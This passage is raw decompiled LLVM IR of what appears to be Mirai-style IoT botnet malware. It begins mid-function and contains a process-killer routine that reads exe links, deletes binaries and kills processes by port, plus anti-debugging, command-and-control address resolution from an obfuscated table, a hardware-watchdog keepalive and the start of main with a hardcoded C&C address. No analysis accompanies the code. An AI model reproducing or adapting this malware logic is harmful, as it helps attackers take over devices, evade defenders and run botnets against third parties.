  store i32 %v3_d378, i32* %r1.global-to-local, align 4
  store i32 %v2_d380, i32* @r0, align 4
  %v3_d38c = call i32 @util_strcpy(i8* %v2_d38c, i32 %v3_d378)
  %v1_d390 = load i32, i32* @sb, align 4
  %v2_d390 = add i32 %v1_d390, %v3_d38c
  store i32 %v2_d390, i32* %r5.global-to-local, align 4
  %v0_d394 = load i32, i32* @r6, align 4
  store i32 %v0_d394, i32* %r1.global-to-local, align 4
  store i32 %v2_d390, i32* @r0, align 4
  %v2_d39c = inttoptr i32 %v2_d390 to i8*
  %v3_d39c = call i32 @util_strcpy(i8* %v2_d39c, i32 %v0_d394)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v3_d39c, i32* %r4.global-to-local, align 4
  %v3_d3ac = call i32 @table_retrieve_val(i32 14, i32* null)
  store i32 %v3_d3ac, i32* %r1.global-to-local, align 4
  %v1_d3b4 = load i32, i32* %r5.global-to-local, align 4
  %v2_d3b4 = add i32 %v1_d3b4, %v3_d39c
  store i32 %v2_d3b4, i32* @r0, align 4
  %v2_d3b8 = inttoptr i32 %v2_d3b4 to i8*
  %v3_d3b8 = call i32 @util_strcpy(i8* %v2_d3b8, i32 %v3_d3ac)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_d3c4 = call i32 @table_retrieve_val(i32 13, i32* null)
  store i32 %v3_d3c4, i32* %r1.global-to-local, align 4
  store i32 %v2_d3d0, i32* @r0, align 4
  %v3_d3d4 = call i32 @util_strcpy(i8* %v2_d3d4, i32 %v3_d3c4)
  %v2_d3e0 = add i32 %v3_d3d4, %v2_d3d0
  store i32 %v2_d3e0, i32* @r5, align 4
  store i32 %v2_d3e0, i32* @r0, align 4
  %v0_d3e8 = load i32, i32* @r6, align 4
  store i32 %v0_d3e8, i32* %r1.global-to-local, align 4
  %v2_d3ec = inttoptr i32 %v2_d3e0 to i8*
  %v3_d3ec = call i32 @util_strcpy(i8* %v2_d3ec, i32 %v0_d3e8)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v3_d3ec, i32* @r4, align 4
  %v3_d3fc = call i32 @table_retrieve_val(i32 29, i32* null)
  store i32 %v3_d3fc, i32* %r1.global-to-local, align 4
  %v0_d404 = load i32, i32* @r4, align 4
  %v1_d404 = load i32, i32* @r5, align 4
  %v2_d404 = add i32 %v1_d404, %v0_d404
  store i32 %v2_d404, i32* @r0, align 4
  %v2_d408 = inttoptr i32 %v2_d404 to i8*
  %v3_d408 = call i32 @util_strcpy(i8* %v2_d408, i32 %v3_d3fc)
  %v1_d410 = call i32 @table_lock_val(i32 13)
  %v1_d418 = call i32 @table_lock_val(i32 14)
  store i32 %v1_cfb8, i32* %r1.global-to-local, align 4
  store i32 4095, i32* %r2.global-to-local, align 4
  %v3_d42c = call i32 @readlink(i32 %v2_d380, i32 %v1_cfb8, i32 4095)
  %v7_d430 = icmp eq i32 %v3_d42c, -1
  store i32 %v3_d42c, i32* @r5, align 4
  br i1 %v7_d430, label %dec_label_pc_d4f4, label %dec_label_pc_d43c

dec_label_pc_d43c:                                ; preds = %dec_label_pc_d354
  store i32 %v1_cfb8, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v4_d444 = add i32 %v3_d42c, %v1_cfb8
  %v5_d444 = inttoptr i32 %v4_d444 to i8*
  store i8 0, i8* %v5_d444, align 1
  %v1_d44c = call i32 @table_unlock_val(i32 30)
  %v0_d450 = load i32, i32* @r4, align 4
  store i32 %v0_d450, i32* %r1.global-to-local, align 4
  %v2_d458 = inttoptr i32 %v0_d450 to i32*
  %v3_d458 = call i32 @table_retrieve_val(i32 30, i32* %v2_d458)
  %v0_d45c = load i32, i32* @r5, align 4
  %v1_d45c = add i32 %v0_d45c, -1
  store i32 %v1_d45c, i32* @r1, align 4
  store i32 %v3_d458, i32* %r2.global-to-local, align 4
  %v4_d468 = call i32 @util_stristr(i8* %v2_cfc8, i32 %v1_d45c, i32 %v3_d458)
  %v7_d46c = icmp eq i32 %v4_d468, -1
  br i1 %v7_d46c, label %dec_label_pc_d488, label %dec_label_pc_d474

dec_label_pc_d474:                                ; preds = %dec_label_pc_d43c
  %v1_d478 = call i32 @unlink(i32 %v1_cfb8)
  %v0_d47c = load i32, i32* @r8, align 4
  store i32 9, i32* %r1.global-to-local, align 4
  %v2_d484 = call i32 @kill(i32 %v0_d47c, i32 9)
  br label %dec_label_pc_d488

dec_label_pc_d488:                                ; preds = %dec_label_pc_d43c, %dec_label_pc_d474
  %v1_d48c = call i32 @table_lock_val(i32 30)
  %v1_d490 = call i32 @__getpid(i32 %v1_d48c)
  store i32 %v1_d490, i32* @r0, align 4
  %v1_d494 = load i32, i32* @r8, align 4
  %v9_d494 = icmp eq i32 %v1_d490, %v1_d494
  br i1 %v9_d494, label %dec_label_pc_d4c0, label %dec_label_pc_d49c

dec_label_pc_d49c:                                ; preds = %dec_label_pc_d488
  %v0_d49c = call i32 @getppid()
  %v1_d4a0 = load i32, i32* @r8, align 4
  %v9_d4a0 = icmp eq i32 %v0_d49c, %v1_d4a0
  br i1 %v9_d4a0, label %dec_label_pc_d4c0, label %dec_label_pc_d4a8

dec_label_pc_d4a8:                                ; preds = %dec_label_pc_d49c
  store i32 ptrtoint (i32* @global_var_25d4c.75 to i32), i32* %r3.global-to-local, align 4
  %v2_d4b0 = load i32, i32* @global_var_25d4c.75, align 4
  store i32 %v2_d4b0, i32* %r1.global-to-local, align 4
  %v3_d4b4 = call i32 @util_strcmp(i8* %v2_cfc8, i32 %v2_d4b0)
  %v2_d4b8 = icmp eq i32 %v3_d4b4, 0
  br i1 %v2_d4b8, label %dec_label_pc_d4cc, label %dec_label_pc_d4a8.dec_label_pc_d4c0_crit_edge

dec_label_pc_d4a8.dec_label_pc_d4c0_crit_edge:    ; preds = %dec_label_pc_d4a8
  %v0_d4c4.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_d4c0

dec_label_pc_d4c0:                                ; preds = %dec_label_pc_d4a8.dec_label_pc_d4c0_crit_edge, %dec_label_pc_d49c, %dec_label_pc_d488
  %v0_d4c4 = phi i32 [ %v0_d4c4.pre, %dec_label_pc_d4a8.dec_label_pc_d4c0_crit_edge ], [ %v0_d49c, %dec_label_pc_d49c ], [ %v1_d490, %dec_label_pc_d488 ]
  store i32 %v2_d358, i32* @r7, align 4
  store i32 %v0_d4c4, i32* @sl, align 4
  br label %dec_label_pc_d2a8.backedge

dec_label_pc_d2a8.backedge:                       ; preds = %dec_label_pc_d30c, %dec_label_pc_d304, %dec_label_pc_d2b8, %dec_label_pc_d4c0, %dec_label_pc_d61c, %.thread10
  %stack_var_-8484.1.be = phi i32 [ %v1_d2dc, %dec_label_pc_d61c ], [ %v1_d2dc, %dec_label_pc_d4c0 ], [ %v1_d2dc, %.thread10 ], [ %stack_var_-8484.2, %dec_label_pc_d2b8 ], [ %v1_d2dc, %dec_label_pc_d304 ], [ %v1_d2dc, %dec_label_pc_d30c ]
  %v0_d2a8 = load i32, i32* @fp, align 4
  %v1_d2ac = inttoptr i32 %v0_d2a8 to i32*
  %v2_d2ac = call i32 @__GI_readdir(i32* %v1_d2ac)
  %v2_d2b0 = icmp eq i32 %v2_d2ac, 0
  br i1 %v2_d2b0, label %dec_label_pc_d348, label %dec_label_pc_d2b8.preheader

dec_label_pc_d4cc:                                ; preds = %dec_label_pc_d4a8
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_d4d4 = call i32 @__libc_open(i32 %v1_cfb8, i32 0)
  %v7_d4d8 = icmp eq i32 %v2_d4d4, -1
  store i32 %v2_d4d4, i32* @r4, align 4
  br i1 %v7_d4d8, label %bb140, label %.thread12

bb140:                                            ; preds = %dec_label_pc_d4cc
  store i32 9, i32* @r1, align 4
  br label %.thread12

.thread12:                                        ; preds = %dec_label_pc_d4cc, %bb140
  store i32 ptrtoint (i32* @global_var_d4ec.81 to i32), i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v7_d4d8, i32 ptrtoint (i32* @global_var_12220.80 to i32))
  %v0_d4ec = load i32, i32* @r4, align 4
  %v1_d4f0 = call i32 @__GI___libc_close(i32 %v0_d4ec)
  br label %dec_label_pc_d4f4

dec_label_pc_d4f4:                                ; preds = %dec_label_pc_d354, %.thread12
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_d4fc = call i32 @__libc_open(i32 %v2_d380, i32 0)
  %v7_d500 = icmp eq i32 %v2_d4fc, -1
  store i32 %v2_d4fc, i32* %sl.global-to-local, align 4
  br i1 %v7_d500, label %dec_label_pc_d61c, label %dec_label_pc_d50c

dec_label_pc_d50c:                                ; preds = %dec_label_pc_d4f4
  %v1_d510 = call i32 @table_unlock_val(i32 18)
  %v1_d518 = call i32 @table_unlock_val(i32 19)
  store i32 %v2_d520, i32* %r1.global-to-local, align 4
  %v3_d528 = call i32 @table_retrieve_val(i32 18, i32* nonnull %stack_var_-44)
  store i32 %v2_d52c, i32* %r1.global-to-local, align 4
  store i32 %v3_d528, i32* @r6, align 4
  %v3_d538 = call i32 @table_retrieve_val(i32 19, i32* nonnull %stack_var_-48)
  store i32 %v3_d538, i32* @r7, align 4
  store i32 %v2_d544, i32* @r4, align 4
  %v0_d54856 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v2_d544, i32* @r1, align 4
  store i32 4096, i32* @r2, align 4
  %v1_d55457 = call i32 @__libc_read(i32 %v0_d54856)
  %tmp141 = icmp slt i32 %v1_d55457, 1
  br i1 %tmp141, label %dec_label_pc_d690, label %dec_label_pc_d560

dec_label_pc_d560:                                ; preds = %dec_label_pc_d50c, %dec_label_pc_d548.backedge
  %v0_d59447 = phi i32 [ %v1_d554, %dec_label_pc_d548.backedge ], [ %v1_d55457, %dec_label_pc_d50c ]
  %v3_d564 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_d564, i32* @r5, align 4
  %v5_d56c = icmp slt i32 %v0_d59447, %v3_d564
  br i1 %v5_d56c, label %dec_label_pc_d57c, label %dec_label_pc_d5d0.lr.ph

dec_label_pc_d5d0.lr.ph:                          ; preds = %dec_label_pc_d560
  %v1_d5c839 = add i32 %v0_d59447, -1
  store i32 %v1_d5c839, i32* %r1.global-to-local, align 4
  %v0_d5d0.pre = load i32, i32* @r6, align 4
  %v1_d5d4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d5d0

dec_label_pc_d57c:                                ; preds = %dec_label_pc_d5c8.backedge, %dec_label_pc_d560
  store i32 %v2_d110, i32* %r1.global-to-local, align 4
  %v3_d580 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_d580, i32* @lr, align 4
  %v5_d588 = icmp slt i32 %v0_d59447, %v3_d580
  br i1 %v5_d588, label %dec_label_pc_d548.backedge, label %.thread25

dec_label_pc_d548.backedge:                       ; preds = %dec_label_pc_d5b0, %.thread25, %dec_label_pc_d57c
  %v0_d548 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v2_d544, i32* @r1, align 4
  store i32 4096, i32* @r2, align 4
  %v1_d554 = call i32 @__libc_read(i32 %v0_d548)
  %tmp142 = icmp slt i32 %v1_d554, 1
  br i1 %tmp142, label %dec_label_pc_d690, label %dec_label_pc_d560

.thread25:                                        ; preds = %dec_label_pc_d57c
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_d59449 = icmp eq i32 %v0_d59447, 0
  br i1 %v2_d59449, label %dec_label_pc_d548.backedge, label %dec_label_pc_d59c.lr.ph

dec_label_pc_d59c.lr.ph:                          ; preds = %.thread25
  %v0_d59c.pre = load i32, i32* @r7, align 4
  %v1_d5a0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d59c

dec_label_pc_d59c:                                ; preds = %dec_label_pc_d5b0, %dec_label_pc_d59c.lr.ph
  %v0_d594.in = phi i32 [ %v0_d59447, %dec_label_pc_d59c.lr.ph ], [ %v0_d594, %dec_label_pc_d5b0 ]
  %v0_d5b0 = phi i32 [ 0, %dec_label_pc_d59c.lr.ph ], [ %v1_d5b0, %dec_label_pc_d5b0 ]
  %v1_d59c = phi i32 [ 0, %dec_label_pc_d59c.lr.ph ], [ %v1_d59c86, %dec_label_pc_d5b0 ]
  %v0_d594 = add i32 %v0_d594.in, -1
  %v2_d59c = add i32 %v1_d59c, %v0_d59c.pre
  %v3_d59c = inttoptr i32 %v2_d59c to i8*
  %v4_d59c = load i8, i8* %v3_d59c, align 1
  %v6_d59c = zext i8 %v4_d59c to i32
  store i32 %v6_d59c, i32* %r2.global-to-local, align 4
  %v2_d5a0 = add i32 %v0_d5b0, %v1_d5a0.pre
  %v3_d5a0 = inttoptr i32 %v2_d5a0 to i8*
  %v4_d5a0 = load i8, i8* %v3_d5a0, align 1
  %v6_d5a0 = zext i8 %v4_d5a0 to i32
  store i32 %v6_d5a0, i32* @r3, align 4
  %v9_d5a4 = icmp eq i8 %v4_d5a0, %v4_d59c
  br i1 %v9_d5a4, label %dec_label_pc_d5ec, label %bb143

bb143:                                            ; preds = %dec_label_pc_d59c
  br label %dec_label_pc_d5b0

dec_label_pc_d5b0:                                ; preds = %bb143, %dec_label_pc_d5ec
  %v1_d59c86 = phi i32 [ %v1_d5ec, %dec_label_pc_d5ec ], [ 0, %bb143 ]
  %v1_d5b0 = add i32 %v0_d5b0, 1
  store i32 %v1_d5b0, i32* %r1.global-to-local, align 4
  %v2_d594 = icmp eq i32 %v0_d594, 0
  br i1 %v2_d594, label %dec_label_pc_d548.backedge, label %dec_label_pc_d59c

dec_label_pc_d5b8:                                ; preds = %dec_label_pc_d5d0
  %v1_d5b8 = add i32 %v1_d5d0, 1
  store i32 %v1_d5b8, i32* @lr, align 4
  %v9_d5bc = icmp eq i32 %v3_d564, %v1_d5b8
  br i1 %v9_d5bc, label %dec_label_pc_d5f8, label %dec_label_pc_d5c8.backedge

dec_label_pc_d5c8.backedge:                       ; preds = %dec_label_pc_d5b8, %dec_label_pc_d5e4
  %v1_d5d077 = phi i32 [ 0, %dec_label_pc_d5e4 ], [ %v1_d5b8, %dec_label_pc_d5b8 ]
  %storemerge = add i32 %storemerge.in, 1
  %v1_d5c8 = add i32 %v0_d5c8, -1
  store i32 %v1_d5c8, i32* %r1.global-to-local, align 4
  %v2_d5c8 = icmp eq i32 %v0_d5c8, 0
  br i1 %v2_d5c8, label %dec_label_pc_d57c, label %dec_label_pc_d5d0

dec_label_pc_d5d0:                                ; preds = %dec_label_pc_d5c8.backedge, %dec_label_pc_d5d0.lr.ph
  %v0_d5c8 = phi i32 [ %v1_d5c839, %dec_label_pc_d5d0.lr.ph ], [ %v1_d5c8, %dec_label_pc_d5c8.backedge ]
  %storemerge.in = phi i32 [ 0, %dec_label_pc_d5d0.lr.ph ], [ %storemerge, %dec_label_pc_d5c8.backedge ]
  %v1_d5d0 = phi i32 [ 0, %dec_label_pc_d5d0.lr.ph ], [ %v1_d5d077, %dec_label_pc_d5c8.backedge ]
  %v2_d5d0 = add i32 %v1_d5d0, %v0_d5d0.pre
  %v3_d5d0 = inttoptr i32 %v2_d5d0 to i8*
  %v4_d5d0 = load i8, i8* %v3_d5d0, align 1
  %v6_d5d0 = zext i8 %v4_d5d0 to i32
  store i32 %v6_d5d0, i32* %r2.global-to-local, align 4
  %v2_d5d4 = add i32 %storemerge.in, %v1_d5d4.pre
  %v3_d5d4 = inttoptr i32 %v2_d5d4 to i8*
  %v4_d5d4 = load i8, i8* %v3_d5d4, align 1
  %v6_d5d4 = zext i8 %v4_d5d4 to i32
  store i32 %v6_d5d4, i32* @r3, align 4
  %v9_d5d8 = icmp eq i8 %v4_d5d4, %v4_d5d0
  br i1 %v9_d5d8, label %dec_label_pc_d5b8, label %dec_label_pc_d5e4

dec_label_pc_d5e4:                                ; preds = %dec_label_pc_d5d0
  br label %dec_label_pc_d5c8.backedge

dec_label_pc_d5ec:                                ; preds = %dec_label_pc_d59c
  %v1_d5ec = add i32 %v1_d59c, 1
  %v9_d5f0 = icmp eq i32 %v3_d580, %v1_d5ec
  br i1 %v9_d5f0, label %dec_label_pc_d5f8, label %dec_label_pc_d5b0

dec_label_pc_d5f8:                                ; preds = %dec_label_pc_d5b8, %dec_label_pc_d5ec
  %v1_d5fc = call i32 @table_lock_val(i32 18)
  %v1_d604 = call i32 @table_lock_val(i32 19)
  %v0_d608 = load i32, i32* %sl.global-to-local, align 4
  %v1_d60c = call i32 @__GI___libc_close(i32 %v0_d608)
  %v0_d610 = load i32, i32* @r8, align 4
  store i32 9, i32* %r1.global-to-local, align 4
  %v2_d618 = call i32 @kill(i32 %v0_d610, i32 9)
  br label %dec_label_pc_d61c

dec_label_pc_d61c:                                ; preds = %dec_label_pc_d4f4, %dec_label_pc_d690, %dec_label_pc_d5f8
  store i32 %v2_d380, i32* @r0, align 4
  store i32 64, i32* @r1, align 4
  %v0_d624 = call i32 @util_zero()
  store i32 %v2_d3d0, i32* @r0, align 4
  store i32 64, i32* @r1, align 4
  %v0_d634 = call i32 @util_zero()
  %v1_d63c = call i32 @sleep(i32 1)
  store i32 %v2_d358, i32* @r7, align 4
  %v0_d644 = load i32, i32* @r8, align 4
  store i32 %v0_d644, i32* @sl, align 4
  br label %dec_label_pc_d2a8.backedge

dec_label_pc_d64c:                                ; preds = %dec_label_pc_d184
  %v1_d654 = call i32 @killer_kill_by_port(i32 42448)
  %v2_d658 = icmp eq i32 %v1_d654, 0
  br i1 %v2_d658, label %dec_label_pc_d660, label %dec_label_pc_d194

dec_label_pc_d660:                                ; preds = %dec_label_pc_d64c
  %v1_d664 = call i32 @killer_kill_by_port(i32 20480)
  %v2_d668 = icmp eq i32 %v1_d664, 0
  br i1 %v2_d668, label %dec_label_pc_d670, label %dec_label_pc_d194

dec_label_pc_d670:                                ; preds = %dec_label_pc_d660
  %v1_d678 = call i32 @killer_kill_by_port(i32 34254)
  %v2_d67c = icmp eq i32 %v1_d678, 0
  br i1 %v2_d67c, label %dec_label_pc_d684, label %dec_label_pc_d194

dec_label_pc_d684:                                ; preds = %dec_label_pc_d670
  %v0_d684 = load i32, i32* @r5, align 4
  %v1_d688 = call i32 @killer_kill_by_port(i32 %v0_d684)
  br label %dec_label_pc_d194

dec_label_pc_d690:                                ; preds = %dec_label_pc_d548.backedge, %dec_label_pc_d50c
  %v1_d694 = call i32 @table_lock_val(i32 18)
  %v1_d69c = call i32 @table_lock_val(i32 19)
  %v0_d6a0 = load i32, i32* %sl.global-to-local, align 4
  %v1_d6a4 = call i32 @__GI___libc_close(i32 %v0_d6a0)
  br label %dec_label_pc_d61c

; uselistorder directives
  uselistorder i32 %v1_d5ec, { 1, 0 }
  uselistorder i32 %v1_d5b0, { 1, 0 }
  uselistorder i32 %v1_d59c, { 1, 0 }
  uselistorder i32 %v0_d5b0, { 1, 0 }
  uselistorder i32 %v1_d554, { 1, 0 }
  uselistorder i32 %v2_d4fc, { 1, 0 }
  uselistorder i1 %v7_d4d8, { 1, 0 }
  uselistorder i32 %v2_d4d4, { 1, 0 }
  uselistorder i32 %v2_d2ac, { 1, 0 }
  uselistorder i32 %stack_var_-8484.1.be, { 1, 0 }
  uselistorder i32 %v3_d42c, { 1, 2, 0 }
  uselistorder i32 %v2_d33c, { 1, 0 }
  uselistorder i32 %v1_d2dc, { 0, 1, 5, 4, 3, 2, 6, 9, 8, 7 }
  uselistorder i32 %v1_d2b8, { 2, 1, 0, 3 }
  uselistorder i32 %v3_d27c, { 1, 2, 0 }
  uselistorder i32 %v3_d244, { 1, 2, 0 }
  uselistorder i32 %v3_d210, { 1, 2, 0 }
  uselistorder i32 %v3_d1d8, { 1, 2, 0 }
  uselistorder i32 %v3_d1a0, { 2, 1, 0 }
  uselistorder i32 %v3_d158, { 1, 2, 0 }
  uselistorder i32 %stack_var_-8484.0, { 1, 0 }
  uselistorder i32 %v2_d544, { 1, 0, 2 }
  uselistorder i32 %v2_d3d0, { 1, 0, 2 }
  uselistorder i32 %v3_d050, { 1, 0 }
  uselistorder i32 %v2_d01c, { 2, 0, 1 }
  uselistorder i32 %v3_cfc8, { 1, 0 }
  uselistorder i32 %v1_cfb8, { 3, 2, 0, 4, 6, 5, 8, 7, 9, 10, 1, 11, 12, 13 }
  uselistorder i32 %storemerge96, { 1, 0 }
  uselistorder i32 %v0_cf28, { 1, 2, 3, 0 }
  uselistorder i32* %stack_var_-48, { 1, 0, 2 }
  uselistorder i32* %stack_var_-44, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 0, 2, 1, 52, 3, 53, 4, 5, 6, 7, 8, 9, 10, 11, 12, 14, 13, 15, 16, 17, 19, 18, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 47, 46, 48, 49, 50, 51 }
  uselistorder i32 (i32, i32)* @kill, { 3, 2, 1, 0 }
  uselistorder i32 (i32*)* @__GI_readdir, { 4, 3, 0, 5, 6, 7, 2, 8, 1 }
  uselistorder i32 (i32, i32)* @listen, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @bind, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 20480, { 0, 2, 1 }
  uselistorder i32 (i32)* @killer_kill_by_port, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @__GI_opendir, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @readlink, { 3, 2, 1, 0 }
  uselistorder i32 4095, { 1, 0, 2, 3 }
  uselistorder i32* @global_var_25d4c.75, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_d61c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_d5f8, { 1, 0 }
  uselistorder label %dec_label_pc_d5c8.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_d5b0, { 1, 0 }
  uselistorder label %dec_label_pc_d560, { 1, 0 }
  uselistorder label %dec_label_pc_d4f4, { 1, 0 }
  uselistorder label %.thread12, { 1, 0 }
  uselistorder label %dec_label_pc_d2a8.backedge, { 4, 3, 0, 1, 5, 2 }
  uselistorder label %dec_label_pc_d488, { 1, 0 }
  uselistorder label %dec_label_pc_d2b8, { 1, 0 }
  uselistorder label %dec_label_pc_d2b8.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_d270, { 1, 0 }
  uselistorder label %dec_label_pc_d238, { 1, 0 }
  uselistorder label %dec_label_pc_d204, { 1, 0 }
  uselistorder label %dec_label_pc_d1cc, { 1, 0 }
  uselistorder label %dec_label_pc_d194, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_d184, { 1, 0 }
  uselistorder label %.thread9, { 1, 0 }
}

define i32 @anti_gdb_entry(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_d6d4.83 to i32), i32* @global_var_230c0.85, align 4
  ret i32 %arg1
}

define i32 @resolve_cnc_addr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_d6dc = call i32 @table_unlock_val(i32 1)
  store i32 ptrtoint ([15 x i8]* @global_var_1a77c.87 to i32), i32* @r0, align 4
  %v2_d6e4 = call i32 @inet_addr(i32 ptrtoint ([15 x i8]* @global_var_1a77c.87 to i32))
  store i32 ptrtoint (i16** @global_var_25d54.89 to i32), i32* @r4, align 4
  store i32 %v2_d6e4, i32* @global_var_25d58.90, align 4
  %v3_d6f8 = call i32 @table_retrieve_val(i32 1, i32* null)
  %v4_d6f8 = inttoptr i32 %v3_d6f8 to i16*
  %v3_d6fc = load i16, i16* %v4_d6f8, align 2
  store i16 %v3_d6fc, i16* bitcast (i32* @global_var_25d56.91 to i16*), align 4
  %v1_d708 = call i32 @table_lock_val(i32 1)
  ret i32 %v1_d708
}

define i32 @watchdog_maintain(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v3_d71c = load i32, i32* @r4, align 4
  %v6_d71c = load i32, i32* @r5, align 4
  %v9_d71c = load i32, i32* @lr, align 4
  %v0_d724 = call i32 @__libc_fork()
  %v7_d728 = icmp eq i32 %v0_d724, -1
  %. = zext i1 %v7_d728 to i32
  %tmp11 = icmp slt i32 %v0_d724, 1
  %storemerge4 = select i1 %tmp11, i32 %., i32 1
  store i32 %storemerge4, i32* @r5, align 4
  %v2_d744 = icmp eq i32 %storemerge4, 0
  store i32 %v0_d724, i32* @global_var_23234.93, align 4
  br i1 %v2_d744, label %dec_label_pc_d75c, label %dec_label_pc_d750

dec_label_pc_d750:                                ; preds = %entry
  store i32 %v3_d71c, i32* @r4, align 4
  store i32 %v6_d71c, i32* @r5, align 4
  store i32 %v9_d71c, i32* @lr, align 4
  ret i32 %v0_d724

dec_label_pc_d75c:                                ; preds = %entry
  store i32 1, i32* %stack_var_-20, align 4
  %v1_d768 = call i32 @table_unlock_val(i32 23)
  %v1_d770 = call i32 @table_unlock_val(i32 24)
  %v0_d774 = load i32, i32* @r5, align 4
  %v2_d77c = inttoptr i32 %v0_d774 to i32*
  %v3_d77c = call i32 @table_retrieve_val(i32 23, i32* %v2_d77c)
  %v2_d784 = call i32 @__libc_open(i32 %v3_d77c, i32 2)
  %v7_d788 = icmp eq i32 %v2_d784, -1
  store i32 %v2_d784, i32* @r4, align 4
  br i1 %v7_d788, label %dec_label_pc_d7d0, label %dec_label_pc_d794

dec_label_pc_d794:                                ; preds = %dec_label_pc_d7d0, %dec_label_pc_d75c
  %v0_d7a0 = phi i32 [ %v2_d7e0, %dec_label_pc_d7d0 ], [ %v2_d784, %dec_label_pc_d75c ]
  %v2_d7a4 = ptrtoint i32* %stack_var_-20 to i32
  %v3_d7a8 = call i32 @ioctl(i32 %v0_d7a0, i32 -2147199228, i32 %v2_d7a4)
  br label %dec_label_pc_d7ac

dec_label_pc_d7ac:                                ; preds = %dec_label_pc_d7ac, %dec_label_pc_d794
  %v0_d7b8 = load i32, i32* @r4, align 4
  %v3_d7c0 = call i32 @ioctl(i32 %v0_d7b8, i32 -2147199227, i32 0)
  %v1_d7c8 = call i32 @sleep(i32 10)
  br label %dec_label_pc_d7ac

dec_label_pc_d7d0:                                ; preds = %dec_label_pc_d75c
  %v0_d7d0 = load i32, i32* @r5, align 4
  %v2_d7d8 = inttoptr i32 %v0_d7d0 to i32*
  %v3_d7d8 = call i32 @table_retrieve_val(i32 24, i32* %v2_d7d8)
  %v2_d7e0 = call i32 @__libc_open(i32 %v3_d7d8, i32 2)
  %v3_d7e4 = icmp eq i32 %v2_d7e0, -1
  store i32 %v2_d7e0, i32* @r4, align 4
  br i1 %v3_d7e4, label %dec_label_pc_d7f0, label %dec_label_pc_d794

dec_label_pc_d7f0:                                ; preds = %dec_label_pc_d7d0
  %v1_d7f4 = call i32 @table_lock_val(i32 23)
  %v1_d7fc = call i32 @table_lock_val(i32 24)
  %v0_d800 = load i32, i32* @r5, align 4
  %v1_d804 = call i32 @__GI_exit(i32 %v0_d800)
  %v0_d808 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_d808, label %bb14, label %bb15

bb14:                                             ; preds = %dec_label_pc_d7f0
  br label %bb15

bb15:                                             ; preds = %dec_label_pc_d7f0, %bb14
  ret i32 %v1_d804

; uselistorder directives
  uselistorder i32 %v2_d7e0, { 1, 2, 0 }
  uselistorder i32 %v2_d784, { 1, 2, 0 }
  uselistorder i32 %storemerge4, { 1, 0 }
  uselistorder i32 %v0_d724, { 3, 2, 1, 0 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8** %argv to i32
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-1416 = alloca i32, align 4
  %stack_var_-42 = alloca i8*, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-392 = alloca i32, align 4
  %stack_var_-264 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %v2_d818 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_d818, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  store i32 %argc, i32* @r6, align 4
  store i32 %tmp, i32* @r8, align 4
  store i32 0, i32* %stack_var_-48, align 4
  %v2_d830 = call i32 @sigemptyset(i32* nonnull %stack_var_-64)
  store i32 %v2_d818, i32* @r0, align 4
  %v2_d83c = call i32 @__GI_sigaddset(i32 %v2_d818, i32 2)
  %v0_d840 = load i32, i32* @r5, align 4
  store i32 %v0_d840, i32* %r2.global-to-local, align 4
  %v4_d84c = call i32 @__GI_sigprocmask(i32 %v0_d840, i32* nonnull %stack_var_-64, i32 %v0_d840)
  %v2_d858 = call i32 @bsd_signal(i32 17, i32 1)
  %v2_d864 = call i32 @bsd_signal(i32 5, i32 54972)
  %v0_d868 = call i32 @util_local_addr()
  store i32 ptrtoint (i16** @global_var_25d54.89 to i32), i32* %r2.global-to-local, align 4
  store i32 1494907824, i32* @global_var_25d58.90, align 4
  store i32 2, i32* %ip.global-to-local, align 4
  store i32 5888, i32* %r3.global-to-local, align 4
  store i32 %v0_d868, i32* @global_var_25d48.57, align 4
  store i16 5888, i16* bitcast (i32* @global_var_25d56.91 to i16*), align 4
  store i16 2, i16* bitcast (i16** @global_var_25d54.89 to i16*), align 4
